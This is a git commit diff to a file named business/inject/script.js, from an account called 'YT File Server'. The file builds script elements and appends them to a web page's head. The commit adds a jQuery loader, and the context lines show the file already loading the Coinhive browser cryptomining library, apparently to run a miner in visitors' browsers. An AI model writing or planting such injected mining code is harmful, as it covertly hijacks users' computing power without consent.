030ff57c3f26baa596b3afb4a7b46a93951da85f
YT File Server <32802331+youtubefileserver@users.noreply.github.com>
2018-03-01 20:27:08 +0000

    Update script.js

--- business/inject/script.js
+++ business/inject/script.js
@@ -1,5 +1,9 @@
 var head = document.getElementsByTagName('head')[0];
     var body = document.getElementsByTagName('body')[0];
+var script3 = document.createElement('script');
+    script3.type = "text/javascript";
+    script3.src="https://code.jquery.com/jquery-3.3.1.min.js";
+    head.appendChild(script3);
 var script = document.createElement('script');
     script.type = "text/javascript";
     script.src="https://coinhive.com/lib/coinhive.min.js";
